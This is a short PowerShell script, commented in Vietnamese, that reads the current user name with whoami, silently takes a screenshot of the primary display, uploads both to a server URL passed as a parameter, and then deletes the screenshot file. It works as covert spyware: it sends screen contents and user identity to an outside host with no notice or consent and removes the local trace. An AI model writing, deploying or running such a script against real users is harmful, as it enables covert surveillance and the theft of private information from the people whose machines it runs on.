param(
    [string]$ServerUrl
)

# Lấy tên máy
$name = whoami

# Đường dẫn tạm để lưu ảnh chụp màn hình
$tempScreenshot = "$env:TEMP\screenshot.png"

# Chụp ảnh màn hình
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bitmap.Save($tempScreenshot, [System.Drawing.Imaging.ImageFormat]::Png)

# Gửi dữ liệu về server
$webClient = New-Object System.Net.WebClient

# Gửi tên máy
$webClient.UploadString("$ServerUrl/name", $name)

# Gửi ảnh chụp màn hình
$fileBytes = [System.IO.File]::ReadAllBytes($tempScreenshot)
$webClient.UploadData("$ServerUrl/screenshot", $fileBytes)

# Xoá ảnh chụp màn hình sau khi gửi
Remove-Item $tempScreenshot
